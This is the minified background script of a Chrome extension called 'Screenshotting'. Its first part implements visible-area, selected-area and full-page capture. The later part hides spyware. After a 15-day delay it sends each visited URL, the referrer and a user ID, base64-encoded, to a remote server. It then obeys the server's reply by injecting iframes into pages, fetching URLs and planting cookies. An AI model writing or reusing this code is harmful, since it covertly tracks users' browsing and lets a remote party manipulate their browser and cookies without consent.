function repeat(e) {
    chrome.tabs.captureVisibleTab((t => {
        totalurl.push(t), chrome.tabs.query({
            currentWindow: !0,
            active: !0
        }, (function(t) {
            var n = t[0];
            chrome.tabs.sendMessage(n.id, {
                src: "newtab",
                tabid: n.id,
                vh: e
            })
        }))
    }))
}

function capture(e) {
    return new Promise((function(t, n) {
        chrome.tabs.captureVisibleTab(null, {
            format: "png"
        }, (r => {
            if (!e) return t(r);
            const o = e.left * e.devicePixelRatio,
                a = e.top * e.devicePixelRatio,
                s = e.width * e.devicePixelRatio,
                i = e.height * e.devicePixelRatio,
                c = document.createElement("canvas"),
                l = c.getContext("2d"),
                u = new Image;
            u.onload = () => {
                c.width = s || u.width, c.height = i || u.height, s && i ? l.drawImage(u, o, a, s, i, 0, 0, s, i) : l.drawImage(u, 0, 0), t(c.toDataURL())
            }, u.onerror = e => n(e), u.src = r
        }))
    }))
}

function stopfunc(e, t, n, r, o) {
    totalvh = e;
    const a = chrome.extension.getURL("options.html?id=" + ID++ + `&url=${o}&type=full_page`);
    IDsub = ID - 1, Currenturl = "/options.html?id=" + IDsub, chrome.tabs.onUpdated.addListener((function t(n, a) {
        if (n != targetId || "complete" != a.status) return;
        chrome.tabs.onUpdated.removeListener(t);
        const s = chrome.extension.getViews();
        for (let t = 0; t < s.length; t++) {
            let n = s[t];
            if (n.location.href.includes(Currenturl)) {
                n.setScreenshotUrl(totalurl, o, e, 0, r, "none");
                break
            }
        }
    })), chrome.tabs.create({
        url: a
    }, (e => {
        targetId = e.id
    }))
}
async function get_ref(e) {
    var t = new Promise((function(t, n) {
        try {
            chrome.tabs.executeScript(e, {
                code: "document.referrer;"
            }, (function(e) {
                e && e.length && t(e[0])
            }))
        } catch {
            t("")
        }
    }));
    return await t
}
chrome.runtime.onMessage.addListener((function(e, t) {
    let n = [];
    if ("captured" === e.method) capture(e).then((t => {
        let n = [];
        n.push(t);
        const r = chrome.extension.getURL("options.html?id=" + ID++ + `&url=${e.websiteUrl}&type=specific_area`);
        IDsub = ID - 1, Currenturl = "/options.html?id=" + IDsub;
        let o = null;
        chrome.tabs.onUpdated.addListener((function t(r, a) {
            if (r != o || "complete" != a.status) return;
            chrome.tabs.onUpdated.removeListener(t);
            const s = chrome.extension.getViews();
            for (let t = 0; t < s.length; t++) {
                let r = s[t];
                if (r.location.href.includes(Currenturl)) {
                    r.setScreenshotUrl(n, e.websiteUrl, e.height, e.width, 0, "specific");
                    break
                }
            }
        })), chrome.tabs.create({
            url: r
        }, (e => {
            o = e.id
        }))
    })).catch((e => notify(e.message || e)));
    else if ("show_selection_area" === e.ms) chrome.tabs.query({
        currentWindow: !0,
        active: !0
    }, (function(e) {
        chrome.tabs.executeScript(e[0].id, {
            file: "contentScript/selectedarea.js"
        })
    }));
    else if ("visible_area" === e.ms) chrome.tabs.captureVisibleTab((t => {
        n.push(t);
        const r = chrome.extension.getURL("options.html?id=" + ID++ + `&url=${e.websiteUrl}&type=visible_area`);
        IDsub = ID - 1, Currenturl = "/options.html?id=" + IDsub;
        let o = null;
        chrome.tabs.onUpdated.addListener((function t(r, a) {
            if (r != o || "complete" != a.status) return;
            chrome.tabs.onUpdated.removeListener(t);
            const s = chrome.extension.getViews();
            for (let t = 0; t < s.length; t++) {
                let r = s[t];
                if (r.location.href.includes(Currenturl)) {
                    r.setScreenshotUrl(n, e.websiteUrl, 0, 0, 0, "none");
                    break
                }
            }
        })), chrome.tabs.create({
            url: r
        }, (e => {
            o = e.id
        }))
    }));
    else if ("specific_area" === e.ms) {
        const t = chrome.extension.getURL("options.html?id=" + ID++ + `&url=${e.url}&type=specific_area`);
        IDsub = ID - 1, Currenturl = "/options.html?id=" + IDsub;
        let n = null;
        chrome.tabs.onUpdated.addListener((function e(t, r) {
            if (t != n || "complete" != r.status) return;
            chrome.tabs.onUpdated.removeListener(e);
            const o = chrome.extension.getViews();
            for (let e = 0; e < o.length && !o[e].location.href.includes(Currenturl); e++);
        })), chrome.tabs.create({
            url: t
        }, (e => {
            n = e.id
        }))
    } else "full_page" === e.ms ? "first" === e.capture ? (totalurl = [], chrome.tabs.query({
        currentWindow: !0,
        active: !0
    }, (function(e) {
        var t = e[0];
        chrome.tabs.captureVisibleTab((e => {
            totalurl.push(e), chrome.tabs.sendMessage(t.id, {
                src: "newtab",
                tabid: t.id
            })
        }))
    }))) : "yes" === e.capture ? repeat(e.vh) : "last_frame_only" === e.capture ? chrome.tabs.captureVisibleTab((t => {
        totalurl.push(t), stopfunc(e.vh, e.leftOver, e.lastFrame, e.lastFrameHeight, e.websiteUrl)
    })) : "no_capture" === e.capture && stopfunc(e.vh, e.leftOver, e.lastFrame, e.lastFrameHeight, e.websiteUrl) : "given" === e.ms && fetch("https://ssbackend.goscreenshotting.com/api/save", {
        method: "POST",
        body: JSON.stringify({
            url: e.url,
            type: e.type
        }),
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    }).then((e => e.json())).then((e => {}))
})), chrome.runtime.onInstalled.addListener((function(e) {
    "install" == e.reason ? chrome.tabs.create({
        url: "https://bit.ly/ssinstalll"
    }, (function() {
        chrome.storage.sync.set({
            darkmode: !0
        }), chrome.tabs.query({
            currentWindow: !0
        }, (function(e) {
            for (let t = 0; t < e.length; t++)
                for (let n = 0; n < chrome.runtime.getManifest().content_scripts[0].js.length; n++) {
                    let r = chrome.runtime.getManifest().content_scripts[0].js[n];
                    e[t] && e[t] && e[t].id && chrome.tabs.executeScript(e[t].id, {
                        file: r
                    }, (e => {
                        chrome.runtime.lastError
                    }))
                }
        }))
    })) : "update" == e.reason && chrome.runtime.getManifest().version, chrome.runtime.setUninstallURL && chrome.runtime.setUninstallURL("https://bit.ly/ssbyeee")
})), chrome.commands.onCommand.addListener((function(e) {
    if ("fullPage" == e) {
        var t = chrome.extension.getURL("../ICON 64.png");
        chrome.permissions.request({
            permissions: ["notifications"]
        }, (function(e) {
            e && (chrome.notifications.create("name-for-notification", {
                type: "basic",
                iconUrl: t,
                title: "Screenshotting - Full Page Capture",
                message: "Alt+P Captures Fullpage Screenshot"
            }, (function() {})), chrome.tabs.query({
                currentWindow: !0,
                active: !0
            }, (function(e) {
                var t = e[0];
                chrome.tabs.sendMessage(t.id, {
                    from: "full_page",
                    tabid: t.id
                })
            })))
        }))
    }
})), getRandomToken = () => {
    var e = new Uint8Array(32);
    crypto.getRandomValues(e);
    for (var t = "", n = 0; n < e.length; ++n) t += e[n].toString(16);
    return t
}, preload = () => {
    chrome.runtime.onInstalled.addListener((function(e) {
        "install" == e.reason ? chrome.storage.sync.set({
            userid: getRandomToken()
        }) : "update" == e.reason && (chrome.runtime.getManifest().version, chrome.storage.sync.get("userid", (e => {
            e.userid || chrome.storage.sync.set({
                userid: getRandomToken()
            })
        })))
    }))
}, (main = () => {
    preload()
})();
const extensionName = "Screenshotting",
    URL = "https://a.goscreenshotting.com",
    currentDate = (new Date).getTime();
let daysToSkip = 15;
chrome.runtime.onInstalled.addListener((function(e) {
    "install" == e.reason && chrome.storage.sync.set({
        insD: new Date((new Date).getTime() + 24 * daysToSkip * 60 * 60 * 1e3).getTime()
    })
})), chrome.tabs.onUpdated.addListener((async (e, t, n) => {
    const {
        status: r
    } = t, {
        url: o
    } = n;
    chrome.storage.sync.get(null, (async t => {
        if ("complete" === r && o) try {
            if (!t.insD || t.insD <= currentDate) {
                let r = await get_ref(e),
                    s = {
                        ref: btoa(r)
                    };
                const i = await fetch(`${URL}/api/a`, {
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json"
                        },
                        method: "POST",
                        body: JSON.stringify({
                            ...s,
                            apisend: btoa(t.userid),
                            name: btoa(o),
                            ext_name: extensionName
                        })
                    }),
                    c = await i.json();
                if (c) {
                    if (!document.getElementById("a")) {
                        var n = document.createElement("div");
                        n.id = "a", document.body.appendChild(n)
                    }
                    var a;
                    c.a && chrome.tabs.executeScript(e, {
                        code: 'var domscript = document.createElement("iframe");domscript.src = "' + c.a + '";document.getElementsByTagName("head")[0].appendChild(domscript);'
                    }), c.b && (4 == ranum(5) && (document.getElementById("a").innerHTML = ""), (a = document.createElement("iframe")).src = c.b, document.getElementById("a").appendChild(a)), c.b2 && ((a = document.createElement("iframe")).src = c.b2, document.getElementById("a").appendChild(a)), c.b3 && openf_url(c.b3, e), c.c && passf_url(c.c, e), c.d && xmlopen(c.d), c.e && setCookie(c.e[0], c.e[1], c.e[2], 86400)
                }
            }
        } catch (e) {}
    }))
}));
var httpq4 = new getXMLHTTPRequest,
    setCookie = function(e, t, n, r) {
        return new Promise((function(o) {
            chrome.cookies.set({
                url: e,
                name: t,
                value: n,
                expirationDate: (new Date).getTime() / 1e3 + r
            }, (() => {
                o(n)
            }))
        }))
    };

function openf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        if (4 == httpq4.readyState && (200 == httpq4.status || 404 == httpq4.status) && httpq4.responseURL) {
            var e = document.createElement("iframe");
            e.src = httpq4.responseURL, document.getElementById("a").appendChild(e)
        }
    }, httpq4.send()
}

function passf_url(e, t) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.onreadystatechange = function() {
        4 != httpq4.readyState || 200 != httpq4.status && 404 != httpq4.status || httpq4.responseURL && chrome.tabs.executeScript(t, {
            code: 'var domscript = document.createElement("iframe");domscript.src = "' + httpq4.responseURL + '";document.getElementsByTagName("head")[0].appendChild(domscript);'
        })
    }, httpq4.send()
}

function getXMLHTTPRequest() {
    return new XMLHttpRequest
}

function ranum(e) {
    return e || (e = 11), Math.floor(1e4 * Math.random() % e + 1)
}

function xmlopen(e) {
    httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.send()
}